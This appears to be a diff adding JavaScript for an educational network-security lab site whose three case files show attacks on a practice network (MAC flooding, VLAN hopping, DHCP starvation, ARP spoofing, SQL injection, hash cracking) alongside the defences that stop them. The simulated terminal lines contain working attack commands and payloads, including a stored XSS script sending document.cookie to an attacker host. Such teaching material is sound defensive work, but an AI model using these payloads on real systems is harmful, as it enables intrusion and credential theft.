+    <line class="infra-link" x1="${NODES.kali.x}" y1="${NODES.kali.y}" x2="${NODES.sw2.x}" y2="${NODES.sw2.y}" stroke-dasharray="4 5" opacity="0.5"></line>
+    ${['kali','r1','sw1','sw2','sw3','dvwa','pc1'].map(id=>nodeMarkup(id,false)).join('')}
+    <circle class="ambient-dot" r="4" fill="var(--brass-bright)">
+      <animate attributeName="cx" values="${NODES.kali.x};${NODES.sw2.x};${NODES.sw1.x}" dur="4.5s" repeatCount="indefinite"></animate>
+      <animate attributeName="cy" values="${NODES.kali.y};${NODES.sw2.y};${NODES.sw1.y}" dur="4.5s" repeatCount="indefinite"></animate>
+    </circle>
+    <circle class="ambient-dot" r="4" fill="var(--line-bright)">
+      <animate attributeName="cx" values="${NODES.r1.x};${NODES.sw1.x};${NODES.sw3.x};${NODES.pc1.x}" dur="6s" repeatCount="indefinite"></animate>
+      <animate attributeName="cy" values="${NODES.r1.y};${NODES.sw1.y};${NODES.sw3.y};${NODES.pc1.y}" dur="6s" repeatCount="indefinite"></animate>
+    </circle>
+  </svg>`;
+}
+
+function scenarioTopologyMarkup(){
+  return `
+  <svg viewBox="0 0 960 600" xmlns="http://www.w3.org/2000/svg" aria-label="Network diagram">
+    <rect class="zone-rect" x="20" y="95" width="170" height="190" rx="16" opacity="0.5"></rect>
+    <text class="zone-label" x="30" y="88">UNTRUSTED / EXTERNAL</text>
+    ${zonesAndLinksMarkup()}
+    ${['kali','r1','sw1','sw2','sw3','dvwa','pc1'].map(id=>nodeMarkup(id,true)).join('')}
+    <g id="scn-dynamic-layer"></g>
+  </svg>`;
+}
+
+function setNodeRole(id, role){
+  const el = document.getElementById('scn-node-'+id);
+  if(!el) return;
+  el.classList.remove('role-idle','role-transit','role-origin','role-compromised','role-victim','role-secure','role-isolated');
+  el.classList.add('role-'+(role||'idle'));
+  const badge = el.querySelector('.node-badge');
+  badge.textContent = BADGE[role] || '';
+}
+
+function resetDiagram(){
+  Object.keys(NODES).forEach(id=>setNodeRole(id,'idle'));
+  const layer = document.getElementById('scn-dynamic-layer');
+  if(layer) layer.innerHTML = '';
+}
+
+function pathLength(points){
+  let total = 0;
+  for(let i=1;i<points.length;i++){
+    total += Math.hypot(points[i].x-points[i-1].x, points[i].y-points[i-1].y);
+  }
+  return total;
+}
+
+function pointAt(points, t){
+  const total = pathLength(points);
+  let target = total * t;
+  for(let i=1;i<points.length;i++){
+    const segLen = Math.hypot(points[i].x-points[i-1].x, points[i].y-points[i-1].y);
+    if(target <= segLen || i === points.length-1){
+      const ratio = segLen === 0 ? 0 : target/segLen;
+      return {
+        x: points[i-1].x + (points[i].x-points[i-1].x)*Math.min(ratio,1),
+        y: points[i-1].y + (points[i].y-points[i-1].y)*Math.min(ratio,1)
+      };
+    }
+    target -= segLen;
+  }
+  return points[points.length-1];
+}
+
+let animFrame = null;
+function animateDot(points, colorClass){
+  if(REDUCED || points.length < 2) return;
+  if(animFrame) cancelAnimationFrame(animFrame);
+  const layer = document.getElementById('scn-dynamic-layer');
+  const dot = document.createElementNS('http://www.w3.org/2000/svg','circle');
+  dot.setAttribute('r','6');
+  dot.setAttribute('class','packet-dot');
+  dot.setAttribute('fill', colorClass);
+  layer.appendChild(dot);
+  const duration = 420 * points.length;
+  const start = performance.now();
+  function tick(now){
+    const t = Math.min((now-start)/duration, 1);
+    const p = pointAt(points, t);
+    dot.setAttribute('cx', p.x);
+    dot.setAttribute('cy', p.y);
+    if(t < 1){ animFrame = requestAnimationFrame(tick); }
+    else { dot.style.transition = 'opacity .6s ease'; dot.style.opacity = '0'; }
+  }
+  animFrame = requestAnimationFrame(tick);
+}
+
+function drawPath(ids, mode){
+  const layer = document.getElementById('scn-dynamic-layer');
+  const pts = ids.map(id=>NODES[id]);
+  const ptStr = pts.map(p=>`${p.x},${p.y}`).join(' ');
+  const poly = document.createElementNS('http://www.w3.org/2000/svg','polyline');
+  poly.setAttribute('points', ptStr);
+  poly.setAttribute('class', 'attack-path ' + mode);
+  layer.appendChild(poly);
+  const accent = getComputedStyle(document.body).getPropertyValue('--case-accent').trim();
+  animateDot(pts, mode === 'pre' ? accent : '#8FD3FF');
+}
+
+function drawFanout(from, to){
+  const layer = document.getElementById('scn-dynamic-layer');
+  const a = NODES[from];
+  to.forEach(id=>{
+    const b = NODES[id];
+    const line = document.createElementNS('http://www.w3.org/2000/svg','line');
+    line.setAttribute('x1',a.x); line.setAttribute('y1',a.y);
+    line.setAttribute('x2',b.x); line.setAttribute('y2',b.y);
+    line.setAttribute('class','fanout-line');
+    layer.appendChild(line);
+  });
+}
+
+function drawBlockBadge(id){
+  const n = NODES[id];
+  const layer = document.getElementById('scn-dynamic-layer');
+  const g = document.createElementNS('http://www.w3.org/2000/svg','g');
+  g.setAttribute('class','block-badge');
+  g.setAttribute('transform', `translate(${n.x+26},${n.y+26})`);
+  g.innerHTML = `<circle r="12"></circle><text y="1">\u2713</text>`;
+  layer.appendChild(g);
+}
+
+function applyDiagramState(step, mode){
+  resetDiagram();
+  const path = (mode === 'pre' ? step.pathPre : (step.pathPost || step.pathPre)) || [];
+  const roles = (mode === 'pre' ? step.rolesPre : (step.rolesPost || step.rolesPre)) || {};
+  Object.keys(roles).forEach(id=>setNodeRole(id, roles[id]));
+  if(path.length > 1){ drawPath(path, mode); }
+  if(step.fanoutPre && mode === 'pre'){ drawFanout(step.fanoutPre.from, step.fanoutPre.to); }
+  if(step.blockNode && (mode === 'post' || step.alwaysBlocked)){ drawBlockBadge(step.blockNode); }
+}
+
+/* ============================= SCENARIO DATA ============================= */
+const SCENARIOS = [
+{
+  id:'flood', num:'01', codename:'THE FLOOD', kicker:'Layer 2 Chaos',
+  threatTag:'Disruption', accent:'flood',
+  desc:'MAC flooding, VLAN hopping, and DHCP starvation — three ways to break a switch before lunch.',
+  chips:['MAC Flood','VLAN Hop','DHCP Starve'], course:'Network Security · Ch. 2–3',
+  mitigations:[
+    'Port Security — MAC address limit with violation shutdown on SW2 / SW3',
+    'DTP disabled + non-default native VLAN on every access port',
+    'DHCP Snooping — trusted uplink, rate-limited access ports on SW1'
+  ],
+  steps:[
+    {
+      title:'Foothold on the DMZ Segment',
+      narrative:'Before touching anything sensitive, the attacker fingerprints the local segment from an access port on SW2, inside VLAN 10.',
+      pathPre:['kali','sw2'], rolesPre:{kali:'origin', sw2:'transit'},
+      terminalPre:[
+        `kali@attacker:~$ ip addr show eth0`,
+        `eth0: 192.168.10.50/24  brd 192.168.10.255`,
+        ``,
+        `kali@attacker:~$ arp-scan --interface=eth0 192.168.10.0/24`,
+        `192.168.10.1    (SW2 uplink)`,
+        `192.168.10.20   DVWA-Server`
+      ]
+    },
+    {
+      title:'MAC Address Table Flood',
+      narrative:'With a foothold on the DMZ segment, macof floods SW2\u2019s CAM table with thousands of bogus source MACs, hoping the switch fails open and broadcasts everything like a hub.',
+      pathPre:['kali','sw2'], rolesPre:{kali:'origin', sw2:'compromised'},
+      fanoutPre:{from:'sw2', to:['sw1','dvwa']},
+      terminalPre:[
+        `kali@attacker:~$ macof -i eth0 -n 8000`,
+        `36:e2:1a:4f:9c:02 -> ff:ff:ff:ff:ff:ff ...`,
+        `a1:04:5b:88:7d:3e -> ff:ff:ff:ff:ff:ff ...`,
+        `**8000 bogus frames sent in 6s — CAM table full**`,
+        `SW2 now floods unknown-unicast traffic to every port`
+      ],
+      pathPost:['kali','sw2'], rolesPost:{kali:'origin', sw2:'secure'},
+      blockNode:'sw2', controlBadge:'PORT SECURITY — max 2 MACs, violation: shutdown',
+      terminalPost:[
+        `kali@attacker:~$ macof -i eth0 -n 8000`,
+        `36:e2:1a:4f:9c:02 -> ff:ff:ff:ff:ff:ff ...`,
+        `%PORT_SECURITY-2-PSECURE_VIOLATION: security violation on Gi0/1, MAC limit (2) exceeded`,
+        `%PM-4-ERR_DISABLE: err-disable state on Gi0/1`,
+        `**Port shut down — flood contained at the edge**`
+      ],
+      defenseNote:'Access ports on SW2 learn a maximum of two MAC addresses; a third bogus address trips a violation and the port shuts itself down instead of letting the CAM table overflow.'
+    },
+    {
+      title:'VLAN Hopping Attempt',
+      narrative:'Next the attacker tries to escape VLAN 10 altogether — negotiating a rogue trunk with Yersinia, then crafting a double-tagged 802.1Q frame aimed at VLAN 20.',
+      pathPre:['kali','sw2','sw1','sw3','pc1'],
+      rolesPre:{kali:'origin', sw2:'compromised', sw1:'transit', sw3:'compromised', pc1:'victim'},
+      terminalPre:[
+        `kali@attacker:~$ yersinia dtp -attack 3`,
+        `**Sending DTP Desirable... trunk negotiated on Gi0/1**`,
+        ``,
+        `kali@attacker:~$ # outer tag = VLAN10, inner tag = VLAN20`,
+        `kali@attacker:~$ sendp(Ether()/Dot1Q(vlan=10)/Dot1Q(vlan=20)/IP(dst="192.168.20.10")/ICMP())`,
+        `**Frame forwarded past SW1 into VLAN 20**`
+      ],
+      pathPost:['kali','sw2'], rolesPost:{kali:'origin', sw2:'secure', sw1:'idle', sw3:'idle', pc1:'idle'},
+      blockNode:'sw2', controlBadge:'DTP DISABLED + explicit native VLAN',
+      terminalPost:[
+        `kali@attacker:~$ yersinia dtp -attack 3`,
+        `Sending DTP Desirable...`,
+        `%DTP-SP-6-TRUNK_NEG_FAIL: negotiation failed on Gi0/1 (nonegotiate)`,
+        `**Double-tagged frame has no trunk to ride — dropped at SW2**`
+      ],
+      defenseNote:'Every access port has trunk negotiation switched off and the native VLAN moved away from the default, so there\u2019s no trunk to hijack and nowhere for a double-tagged frame to hop to.'
+    },
+    {
+      title:'DHCP Starvation',
+      narrative:'Finally, a flood of DHCP DISCOVER packets with randomized MAC addresses races to exhaust R1\u2019s address pool before Employee-PC1 can ever ask for a lease.',
+      pathPre:['kali','sw3','sw1','r1'],
+      rolesPre:{kali:'origin', sw3:'compromised', sw1:'transit', r1:'compromised', pc1:'victim'},
+      terminalPre:[
+        `kali@attacker:~$ dhcpstarv -i eth0 -v vlan20`,
+        `Sent 254 DISCOVER requests with randomized MACs...`,
+        `**Pool 192.168.20.0/24 exhausted — 0 addresses free**`,
+        ``,
+        `employee-pc1$ dhclient eth0`,
+        `No DHCPOFFER received — timed out`
+      ],
+      pathPost:['kali','sw3'], rolesPost:{kali:'origin', sw3:'secure', sw1:'idle', r1:'idle', pc1:'idle'},
+      blockNode:'sw3', controlBadge:'DHCP SNOOPING — untrusted port rate limit',
+      terminalPost:[
+        `kali@attacker:~$ dhcpstarv -i eth0 -v vlan20`,
+        `Sent 40 DISCOVER requests...`,
+        `%DHCP_SNOOPING-5-DHCP_SNOOPING_RATE_LIMIT_EXCEEDED: rate limit exceeded on Gi0/2`,
+        `**Excess DISCOVER traffic dropped at the access port**`,
+        ``,
+        `employee-pc1$ dhclient eth0`,
+        `DHCPACK from 192.168.20.1 — lease 192.168.20.101 obtained`
+      ],
+      defenseNote:'Only the uplink toward R1 is trusted for DHCP traffic; every access port is rate-limited, so a flood of forged DISCOVER packets never reaches the real pool.'
+    }
+  ]
+},
+{
+  id:'ghost', num:'02', codename:'THE GHOST IN THE WIRE', kicker:'ARP Spoofing / MITM',
+  threatTag:'Interception', accent:'ghost',
+  desc:'A quiet man-in-the-middle between an employee and the gateway — until the switch starts checking IDs.',
+  chips:['ARP Spoof','MITM','Packet Capture'], course:'Network Security + Information Security',
+  mitigations:[
+    'DHCP Snooping binding table — the trusted source of IP/MAC truth',
+    'Dynamic ARP Inspection (DAI) on VLAN 20 — validates every ARP reply against it'
+  ],
+  steps:[
+    {
+      title:'Blending Into the Internal VLAN',
+      narrative:'Now positioned on VLAN 20, the attacker quietly maps who\u2019s talking to whom before touching anything.',
+      pathPre:['kali','sw3'], rolesPre:{kali:'origin', sw3:'transit'},
+      terminalPre:[
+        `kali@attacker:~$ ip addr show eth0`,
+        `eth0: 192.168.20.66/24`,
+        ``,
+        `kali@attacker:~$ arp -a`,
+        `? (192.168.20.1)  at 00:1a:aa:aa:aa:aa  [R1 / gateway]`,
+        `? (192.168.20.10) at 00:1a:bb:bb:bb:bb  [Employee-PC1]`
+      ]
+    },
+    {
+      title:'ARP Cache Poisoning',
+      narrative:'Forged ARP replies tell Employee-PC1 that the attacker is the gateway, and tell R1 the attacker is Employee-PC1 — quietly slipping into the middle of the conversation.',
+      pathPre:['pc1','kali','r1'],
+      rolesPre:{pc1:'victim', kali:'compromised', r1:'transit', sw3:'idle', sw1:'idle'},
+      terminalPre:[
+        `kali@attacker:~$ arpspoof -i eth0 -t 192.168.20.10 192.168.20.1`,
+        `Sent forged ARP reply: 192.168.20.1 is-at <kali-mac>`,
+        `kali@attacker:~$ arpspoof -i eth0 -t 192.168.20.1 192.168.20.10`,
+        `Sent forged ARP reply: 192.168.20.10 is-at <kali-mac>`,
+        ``,
+        `employee-pc1$ arp -a`,
+        `**? (192.168.20.1) at <kali-mac>  — poisoned**`
+      ],
+      pathPost:['pc1','sw3','sw1','r1'],
+      rolesPost:{pc1:'transit', sw3:'secure', sw1:'transit', r1:'transit', kali:'isolated'},
+      blockNode:'sw3', controlBadge:'DYNAMIC ARP INSPECTION (DAI)',
+      terminalPost:[
+        `kali@attacker:~$ arpspoof -i eth0 -t 192.168.20.10 192.168.20.1`,
+        `Sent forged ARP reply: 192.168.20.1 is-at <kali-mac>`,
+        `%SW_DAI-4-DHCP_SNOOPING_DENY: 1 invalid ARP on Gi0/3 (192.168.20.1/<kali-mac>)`,
+        `**ARP reply dropped — binding table mismatch**`
+      ],
+      defenseNote:'Every ARP reply on VLAN 20 is checked against the DHCP snooping binding table built earlier; a reply that doesn\u2019t match gets dropped at the switch port instead of updating anyone\u2019s ARP cache.'
+    },
+    {
+      title:'Sniffing the Session',
+      narrative:'With traffic quietly rerouted through the attacker\u2019s NIC, Wireshark waits in the background for something interesting — like an employee logging into the internal portal.',
+      pathPre:['pc1','kali','r1'],
+      rolesPre:{pc1:'victim', kali:'compromised', r1:'transit'},
+      terminalPre:[
+        `kali@attacker:~$ wireshark -i eth0 -k -f "tcp port 80"`,
+        `**HTTP Basic Auth captured**`,
+        `Host: intranet.vaultbreak.local`,
+        `User: j.morales   Pass: Summer2024!`
+      ],
+      pathPost:['pc1','sw3','sw1','r1'],
+      rolesPost:{pc1:'transit', sw3:'secure', sw1:'transit', r1:'transit', kali:'isolated'},
+      blockNode:'sw3', controlBadge:'DYNAMIC ARP INSPECTION (DAI)',
+      terminalPost:[
+        `kali@attacker:~$ wireshark -i eth0 -k -f "tcp port 80"`,
+        `(no matching traffic — this host is never on the path)`,
+        `**Nothing to capture — the MITM was blocked upstream**`
+      ],
+      defenseNote:'No man-in-the-middle position means no vantage point to sniff from — the login never takes a detour through the attacker\u2019s NIC.'
+    }
+  ]
+},
+{
+  id:'ledger', num:'03', codename:'THE HIDDEN LEDGER', kicker:'Web Exploitation, Steganography &amp; Cryptography',
+  threatTag:'Full Breach', accent:'ledger',
+  desc:'SQL injection, XSS, cracked hashes, and a secret hidden inside a JPEG.',
+  chips:['SQLi','XSS','Steganography','Vigen\u00e8re'], course:'Information Security · Ch. 2–4',
+  mitigations:[
+    'Parameterized queries + input validation on the DVWA login form',
+    'Output encoding on reflected fields (the guestbook)',
+    'Salted password hashing + a stronger minimum password policy',
+    'Extended ACL — the DMZ cannot initiate traffic into the Internal VLAN'
+  ],
+  steps:[
+    {
+      title:'Reconnaissance',
+      narrative:'From outside the DMZ, a service scan looks for open doors on the public-facing web server.',
+      pathPre:['kali','r1','sw1','sw2','dvwa'],
+      rolesPre:{kali:'origin', r1:'transit', sw1:'transit', sw2:'transit', dvwa:'victim'},
+      terminalPre:[
+        `kali@attacker:~$ nmap -sV 192.168.10.20`,
+        `PORT   STATE SERVICE  VERSION`,
+        `22/tcp open  ssh      OpenSSH 8.4`,
+        `80/tcp open  http     Apache/2.4.41 (DVWA)`
+      ]
+    },
+    {
+      title:'SQL Injection',
+      narrative:'The login form passes user input straight into a query. A tautology payload skips authentication; sqlmap then automates dumping the user table.',
+      pathPre:['kali','r1','sw1','sw2','dvwa'],
+      rolesPre:{kali:'origin', r1:'transit', sw1:'transit', sw2:'transit', dvwa:'compromised'},
+      terminalPre:[
+        `kali@attacker:~$ curl -d "user=admin'-- -&pass=x" http://192.168.10.20/login.php`,
+        `**Login bypassed — welcome, admin**`,
+        ``,
+        `kali@attacker:~$ sqlmap -u "http://192.168.10.20/login.php" --dump -T users`,
+        `username    password_hash`,
+        `admin       5f4dcc3b5aa765d61d8327deb882cf99`,
+        `j.morales   e10adc3949ba59abbe56e057f20f883e`
+      ],
+      pathPost:['kali','r1','sw1','sw2','dvwa'],
+      rolesPost:{kali:'origin', r1:'transit', sw1:'transit', sw2:'transit', dvwa:'secure'},
+      blockNode:'dvwa', controlBadge:'PARAMETERIZED QUERIES + INPUT VALIDATION',
+      terminalPost:[
+        `kali@attacker:~$ curl -d "user=admin'-- -&pass=x" http://192.168.10.20/login.php`,
+        `{"error":"Invalid username or password."}`,
+        ``,
+        `kali@attacker:~$ sqlmap -u "http://192.168.10.20/login.php" --dump -T users`,
+        `**[CRITICAL] all tested parameters appear to be not injectable**`
+      ],
+      defenseNote:'The login form now binds input as data, never as code, and validates it server-side — a crafted string is just a rejected password, not a bypass.'
+    },
+    {
+      title:'Cross-Site Scripting',
+      narrative:'A guestbook field echoes whatever HTML it\u2019s handed. A small script tag rides along with the next visitor\u2019s page load.',
+      pathPre:['kali','r1','sw1','sw2','dvwa'],
+      rolesPre:{kali:'origin', r1:'transit', sw1:'transit', sw2:'transit', dvwa:'compromised'},
+      terminalPre:[
+        `kali@attacker:~$ curl -d "comment=<scr` + `ipt>document.location='//kali/steal?c='+document.cookie<\/scr` + `ipt>" http://192.168.10.20/guestbook.php`,
+        `Comment stored.`,
+        `-- next visitor's browser --`,
+        `**GET /steal?c=PHPSESSID=8f2a1c...  (cookie exfiltrated)**`
+      ],
+      pathPost:['kali','r1','sw1','sw2','dvwa'],
+      rolesPost:{kali:'origin', r1:'transit', sw1:'transit', sw2:'transit', dvwa:'secure'},
+      blockNode:'dvwa', controlBadge:'OUTPUT ENCODING',
+      terminalPost:[
+        `kali@attacker:~$ curl -d "comment=<scr` + `ipt>document.location='//kali/steal?c='+document.cookie<\/scr` + `ipt>" http://192.168.10.20/guestbook.php`,
+        `Comment stored.`,
+        `-- next visitor's browser renders --`,
+        `**&lt;script&gt;document.location=...&lt;/script&gt;  — inert text, not executed**`
+      ],
+      defenseNote:'User-supplied text is HTML-encoded before it\u2019s ever rendered back, so a script tag shows up as text on the page instead of running as code.'
+    },
+    {
+      title:'Cracking the Password Hashes',
+      narrative:'The hashes lifted in Step 2 go straight into an offline cracking run against a common wordlist.',
+      pathPre:[], rolesPre:{kali:'origin', dvwa:'compromised'},
+      terminalPre:[
+        `kali@attacker:~$ hashcat -m 0 hashes.txt rockyou.txt`,
+        `5f4dcc3b5aa765d61d8327deb882cf99:password`,
+        `e10adc3949ba59abbe56e057f20f883e:123456`,
+        `**Cracked: 2/2 hashes in 4 seconds**`
+      ],
+      pathPost:[], rolesPost:{kali:'origin', dvwa:'secure'},
+      controlBadge:'SALTED HASHING + PASSWORD POLICY',
+      terminalPost:[
+        `kali@attacker:~$ hashcat -m 0 hashes.txt rockyou.txt`,
+        `No input hashes loaded — nothing was dumped in Step 2`,
+        `**Even a hash recovered by other means would resist rockyou.txt in any practical timeframe**`
+      ],
+      defenseNote:'Passwords are hashed with a per-user salt and a stronger minimum policy is enforced, so even a leaked hash is expensive to crack and unlikely to be a dictionary word to begin with.'
+    },
+    {
+      title:'Finding the Hidden Image',
+      narrative:'Poking around the server\u2019s upload directory — only reachable because of Step 2\u2019s foothold — the attacker finds an innocent-looking ledger.jpg.',
+      pathPre:['kali','r1','sw1','sw2','dvwa'],
+      rolesPre:{kali:'origin', r1:'transit', sw1:'transit', sw2:'transit', dvwa:'compromised'},
+      terminalPre:[
+        `kali@attacker:~$ stegseek ledger.jpg rockyou.txt`,
+        `[i] Found passphrase: "vault99"`,
+        `**Extracting hidden data to ledger.jpg.out ... done**`
+      ],
+      pathPost:['kali','r1','sw1','sw2','dvwa'],
+      rolesPost:{kali:'origin', r1:'transit', sw1:'transit', sw2:'transit', dvwa:'secure'},
+      blockNode:'dvwa', controlBadge:'PARAMETERIZED QUERIES + INPUT VALIDATION',
+      terminalPost:[
+        `kali@attacker:~$ stegseek ledger.jpg rockyou.txt`,
+        `Connection refused — no valid session on DVWA-Server`,
+        `**Without Step 2\u2019s foothold, the upload directory was never reachable**`
+      ],
+      defenseNote:'There\u2019s no shell, no session, and no file listing to find ledger.jpg in — the SQL injection fix in Step 2 closes this off before it starts.'
+    },
+    {
+      title:'Decoding the Vigen\u00e8re Cipher',
+      narrative:'The extracted file holds a short block of ciphertext. With a keyword recovered from the same breach, it decodes cleanly.',
+      pathPre:[], rolesPre:{kali:'origin', dvwa:'compromised'},
+      terminalPre:[
+        `kali@attacker:~$ cat ledger.jpg.out`,
+        `Ciphertext: LXFOPV EFRNHR`,
+        `Key: VAULT`,
+        ``,
+        `kali@attacker:~$ python3 vigenere.py --decrypt --key VAULT "LXFOPV EFRNHR"`,
+        `**Plaintext: ATTACK AT DAWN**`
+      ],
+      pathPost:[], rolesPost:{kali:'origin', dvwa:'secure'},
+      terminalPost:[
+        `kali@attacker:~$ cat ledger.jpg.out`,
+        `cat: ledger.jpg.out: No such file`,
+        `**Nothing was ever extracted — the chain broke at Step 2**`
+      ],
+      defenseNote:'The whole exfiltration chain — SQLi \u2192 file access \u2192 steganography \u2192 cipher — only ever needed one link broken to fail completely.'
+    },
+    {
+      title:'Segmentation Holds, Regardless',
+      narrative:'Even in the worst case — DVWA-Server fully compromised — the attacker tries to pivot from the DMZ into the Internal VLAN. This is where segmentation does its job, independent of everything else.',
+      pathPre:['dvwa','sw2','sw1','sw3'],
+      rolesPre:{dvwa:'compromised', sw2:'transit', sw1:'transit', sw3:'secure', pc1:'idle'},
+      blockNode:'sw3', alwaysBlocked:true, controlBadge:'EXTENDED ACL — DMZ \u2192 INTERNAL DENY',
+      terminalPre:[
+        `kali@attacker:~$ ping 192.168.20.10   # from compromised DVWA-Server`,
+        `%ACL_DENY: 192.168.10.20 -> 192.168.20.10 blocked by extended ACL`,
+        `**Request timed out — DMZ cannot reach Internal VLAN**`
+      ],
+      defenseNote:'This ACL sits between the DMZ and Internal VLANs no matter what happens upstream — segmentation is the safety net for every scenario in this project, not just this one.'
+    }
+  ]
+}
+];
+
+/* ============================= LANDING: RENDER CASE CARDS ============================= */
+function renderCaseCards(){
+  const grid = document.getElementById('caseGrid');
+  grid.innerHTML = SCENARIOS.map(s => `
+    <button class="case-card" data-case="${s.accent}" data-open="${s.id}">
+      <span class="case-num">CASE ${s.num}</span>
+      <h3>${s.codename}</h3>
+      <span class="case-kicker">${s.kicker}</span>
+      <p class="case-desc">${s.desc}</p>
+      <div class="case-chips">${s.chips.map(c=>`<span class="chip">${c}</span>`).join('')}</div>
+      <span class="case-course">${s.course}</span>
+      <span class="case-open">Open case file &rarr;</span>
+    </button>
+  `).join('');
+  grid.querySelectorAll('[data-open]').forEach(btn=>{
+    btn.addEventListener('click', ()=>openScenario(btn.getAttribute('data-open')));
+  });
+}
+
+/* ============================= STATE ============================= */
+let currentScenario = null;
+let currentStepIdx = 0;
+let currentMode = 'pre';
+
+function showView(view){
+  document.getElementById('view-landing').hidden = view !== 'landing';
+  document.getElementById('view-scenario').hidden = view !== 'scenario';
+  document.getElementById('landingNav').classList.toggle('hidden', view !== 'landing');
+  document.getElementById('scenarioNav').classList.toggle('active', view === 'scenario');
+  window.scrollTo({top:0, behavior:'instant' in document.documentElement.style ? 'instant' : 'auto'});
+}
+
+function openScenario(id){
+  currentScenario = SCENARIOS.find(s=>s.id===id);
+  currentStepIdx = 0;
+  currentMode = 'pre';
+  document.body.setAttribute('data-case', currentScenario.accent);
+  document.body.style.setProperty('--case-accent', `var(--c-${currentScenario.accent})`);
+  document.getElementById('caseEyebrow').textContent = 'Case ' + currentScenario.num;
+  document.getElementById('caseTitle').textContent = currentScenario.codename;
+  document.getElementById('caseKicker').innerHTML = currentScenario.kicker + ' &middot; ' + currentScenario.course;
+  document.getElementById('headerCaseTitle').textContent = 'CASE ' + currentScenario.num + ' — ' + currentScenario.codename;
+
+  const svgWrap = document.getElementById('scenarioSvgWrap');
+  svgWrap.innerHTML = scenarioTopologyMarkup();
+
+  buildStepDots();
+  renderStep();
+  showView('scenario');
+}
+
+function closeScenario(){
+  currentScenario = null;
+  showView('landing');
+}
+
+function buildStepDots(){
+  const wrap = document.getElementById('stepDots');
+  const total = currentScenario.steps.length + 1; // +1 for recap
+  let html = '';
+  for(let i=0;i<total;i++){
+    const label = i < currentScenario.steps.length ? (i+1) : '\u2713';
+    html += `<button class="step-dot" data-idx="${i}" aria-label="Go to step ${i+1}">${label}</button>`;
+  }
+  wrap.innerHTML = html;
+  wrap.querySelectorAll('.step-dot').forEach(dot=>{
+    dot.addEventListener('click', ()=>{ currentStepIdx = parseInt(dot.getAttribute('data-idx'),10); renderStep(); });
+  });
+}
+
+function updateStepDots(){
+  document.querySelectorAll('.step-dot').forEach(dot=>{
+    const i = parseInt(dot.getAttribute('data-idx'),10);
+    dot.classList.toggle('active', i === currentStepIdx);
+    dot.classList.toggle('done', i < currentStepIdx);
+  });
+}
+
+function renderTerminal(lines){
+  const container = document.getElementById('terminalLines');
+  container.innerHTML = '';
+  lines.forEach((raw, i)=>{
+    const esc = escapeHtml(raw);
+    const withFlags = esc.replace(/\*\*(.+?)\*\*/g, '<span class="flag">$1</span>');
+    const div = document.createElement('div');
+    div.className = 'term-line' + (raw.startsWith('%') ? ' syslog' : '');
+    div.style.animationDelay = (i*0.06)+'s';
+    div.innerHTML = withFlags.length ? withFlags : '&nbsp;';
+    container.appendChild(div);
+  });
+}
+
+function renderStep(){
+  const totalSteps = currentScenario.steps.length;
+  document.getElementById('stepCounter').textContent =
+    currentStepIdx < totalSteps ? `STEP ${currentStepIdx+1} OF ${totalSteps}` : 'MITIGATION DEBRIEF';
+  updateStepDots();
+
+  const normalStep = document.getElementById('normalStep');
+  const recapBox = document.getElementById('recapBox');
+  const modeToggle = document.querySelector('.mode-toggle');
+
+  if(currentStepIdx >= totalSteps){
+    normalStep.hidden = true;
+    recapBox.hidden = false;
+    modeToggle.style.opacity = '0.35';
+    modeToggle.style.pointerEvents = 'none';
+    document.getElementById('recapLead').textContent =
+      `Every attack in "${currentScenario.codename}" now fails. Here\u2019s what stopped each one:`;
+    document.getElementById('recapList').innerHTML =
+      currentScenario.mitigations.map(m=>`<li>${m}</li>`).join('');
+    resetDiagram();
+    document.getElementById('nextBtn').textContent = isLastScenario() ? 'Back to Case Files' : 'Next Case \u2192';
+    document.getElementById('prevBtn').disabled = false;
+    return;
+  }
+
+  normalStep.hidden = false;
+  recapBox.hidden = true;
+  modeToggle.style.opacity = '1';
+  modeToggle.style.pointerEvents = 'auto';
+
+  const step = currentScenario.steps[currentStepIdx];
+  document.getElementById('stepTitle').textContent = step.title;
+  document.getElementById('stepNarrative').textContent = step.narrative;
+
+  document.getElementById('modePre').setAttribute('aria-pressed', currentMode === 'pre');
+  document.getElementById('modePost').setAttribute('aria-pressed', currentMode === 'post');
+
+  const terminalBox = document.getElementById('terminalBox');
+  terminalBox.classList.remove('mode-pre','mode-post');
+  terminalBox.classList.add('mode-'+currentMode);
+
+  const lines = currentMode === 'pre' ? step.terminalPre : (step.terminalPost || step.terminalPre);
+  renderTerminal(lines);
+
+  const defenseNote = document.getElementById('defenseNote');
+  if(currentMode === 'post' && step.defenseNote){
+    defenseNote.hidden = false;
+    document.getElementById('controlChip').textContent = step.controlBadge || 'HARDENED';
+    document.getElementById('defenseText').textContent = step.defenseNote;
+  } else {
+    defenseNote.hidden = true;
+  }
+
+  applyDiagramState(step, currentMode);
+
+  document.getElementById('prevBtn').disabled = false;
+  document.getElementById('nextBtn').textContent = (currentStepIdx === totalSteps-1) ? 'Finish Case \u2192' : 'Next \u2192';
+}
+
+function isLastScenario(){
+  return SCENARIOS.indexOf(currentScenario) === SCENARIOS.length - 1;
+}
+
+function goNext(){
+  const totalWithRecap = currentScenario.steps.length + 1;
+  if(currentStepIdx < totalWithRecap - 1){
+    currentStepIdx++;
+    renderStep();
+  } else {
+    const idx = SCENARIOS.indexOf(currentScenario);
+    if(isLastScenario()){ closeScenario(); }
+    else { openScenario(SCENARIOS[idx+1].id); }
+  }
+}
+
+function goPrev(){
+  if(currentStepIdx > 0){ currentStepIdx--; renderStep(); }
+  else { closeScenario(); }
+}
+
+/* ============================= WIRE UP ============================= */
+document.addEventListener('DOMContentLoaded', function(){
+  document.getElementById('heroSvgWrap').innerHTML = heroTopologyMarkup();
+  renderCaseCards();
+
+  document.getElementById('backBtn').addEventListener('click', closeScenario);
+  document.getElementById('prevBtn').addEventListener('click', goPrev);
+  document.getElementById('nextBtn').addEventListener('click', goNext);
+  document.getElementById('modePre').addEventListener('click', ()=>{ currentMode='pre'; renderStep(); });
+  document.getElementById('modePost').addEventListener('click', ()=>{ currentMode='post'; renderStep(); });
+  document.getElementById('replayBtn').addEventListener('click', ()=>{
+    const step = currentScenario.steps[currentStepIdx];
+    if(step) applyDiagramState(step, currentMode);
+  });
+});
+
+})();
+</script>
+</body>
+</html>
